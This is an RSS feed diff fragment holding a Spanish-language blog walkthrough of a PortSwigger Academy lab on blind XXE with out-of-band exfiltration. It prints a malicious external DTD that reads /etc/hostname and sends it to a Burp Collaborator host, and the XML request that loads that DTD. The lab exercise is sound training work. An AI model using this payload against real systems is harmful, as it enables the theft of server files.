+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar una inyeccion XXE pero en este caso de tipo blind valiendose de la configuracion debil del analizador. Pero esta vez exfiltrando datos a travez de un DTD externo malicioso al que se conectara.&lt;/p&gt;
+&lt;p&gt;Primero notamos la opcion de &lt;code&gt;Check stock&lt;/code&gt; de la web en la que recuperamos la existencia de los productos.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 304px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/checkstock.png&#34; data-size=&#34;1760x1385&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/checkstock.png&#34;
+			width=&#34;1760&#34;
+			height=&#34;1385&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/checkstock_hu044b93324b0dd4a55e94b7edd731c2e3_1089674_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Check stock&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Check stock&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Al ir a la opcion de &lt;code&gt;Check stock&lt;/code&gt; en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 214; 
+			flex-basis: 514px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request1.png&#34; data-size=&#34;1194x557&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request1.png&#34;
+			width=&#34;1194&#34;
+			height=&#34;557&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request1_hude34473389320160cca6f05ca7aeb82e_70634_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request1_hude34473389320160cca6f05ca7aeb82e_70634_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion para recuperar el stock del producto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion para recuperar el stock del producto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Sabiendo esto lo primero que haremos sera crear nuestra entidad DTD que estara alojada en un servidor web al cual luego se le hara referencia en la consulta enviada para poder inyectarla. Lo que hara esta entidad externa maliciosa es primero pedir el archivo &lt;code&gt;/etc/hostname&lt;/code&gt; y luego enviar el contenido de esta solicitud hacia otro servidor en este caso en burpcollaborator la cual veremos un log el contenido del hostname.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;#34;file:///etc/hostname&amp;#34;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY &amp;amp;#x25; exfiltrate SYSTEM &amp;#39;http://0mnodc980sc5dnrg5sbsauaco3uuij.burpcollaborator.net/?x=%file;&amp;#39;&amp;gt;&lt;/span&gt;&amp;#34;&amp;gt;
+%eval;
+%exfiltrate;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 130; 
+			flex-basis: 312px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/exploit.png&#34; data-size=&#34;1788x1375&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/exploit.png&#34;
+			width=&#34;1788&#34;
+			height=&#34;1375&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/exploit_huc780d4d9d682ff53d2c5dce50dcce1bc_119413_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/exploit_huc780d4d9d682ff53d2c5dce50dcce1bc_119413_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Entidad DTD alojada en un servidor externo&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Entidad DTD alojada en un servidor externo&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Sabiendo esto haremos nuestra peticion pero referenciando a la entidad externa maliciosa alojada en el servidor&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY % xxe SYSTEM &amp;#34;https://exploit-acb21f3b1ee66c24c17b96bb01c60046.web-security-academy.net/exploit.dtd&amp;#34;&amp;gt;&lt;/span&gt; %xxe;]&amp;gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;stockCheck&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;productId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/productId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;storeId&amp;gt;&lt;/span&gt;1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/storeId&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/stockCheck&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 237; 
+			flex-basis: 571px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request2.png&#34; data-size=&#34;1235x519&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request2.png&#34;
+			width=&#34;1235&#34;
+			height=&#34;519&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request2_hu577f581caaf7e18d7e74189b274ec2a7_77296_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/request2_hu577f581caaf7e18d7e74189b274ec2a7_77296_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Realizando peticion para blind XXE referenciando a la entidad externa&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Realizando peticion para blind XXE referenciando a la entidad externa&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Ahora que ya hemos ejecutado vemos primero el log de apache por lo que se ha referenciado correctamente, solo queda esperar que ejecute todo lo que esta dentro de la entidad.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 4363; 
+			flex-basis: 10472px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/log.png&#34; data-size=&#34;1440x33&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/log.png&#34;
+			width=&#34;1440&#34;
+			height=&#34;33&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/log_hu79fd9eefd6e588d12b83dab716af4b5a_14738_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/log_hu79fd9eefd6e588d12b83dab716af4b5a_14738_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Log de la solicitud http&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Log de la solicitud http&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y se ejecuta correctamente lo de la entidad y vemos claramente como hace la solicitud con el contenido de &lt;code&gt;/etc/hostname&lt;/code&gt; en la peticion &lt;code&gt;GET&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 162; 
+			flex-basis: 390px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/collaborator.png&#34; data-size=&#34;767x471&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/collaborator.png&#34;
+			width=&#34;767&#34;
+			height=&#34;471&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/collaborator_hu9564be3f1d1439272b03e917bb3d52e9_28845_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/collaborator_hu9564be3f1d1439272b03e917bb3d52e9_28845_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Log de consulta DNS y HTTP&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Log de consulta DNS y HTTP&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto hemos resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 203; 
+			flex-basis: 487px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/resuelto.png&#34; data-size=&#34;1783x878&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/resuelto.png&#34;
+			width=&#34;1783&#34;
+			height=&#34;878&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/resuelto_hua39da2f78ef6649075c74358d01483cb_487969_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-xml-external-entity-xxe-lab-5/resuelto_hua39da2f78ef6649075c74358d01483cb_487969_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
         <title>Portswigger Academy Learning Path: Server-side request forgery (SSRF) Lab 7</title>
         <link>https://www.alux.cc/p/portswigger-academy-learning-path-server-side-request-forgery-ssrf-lab-7/</link>
         <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
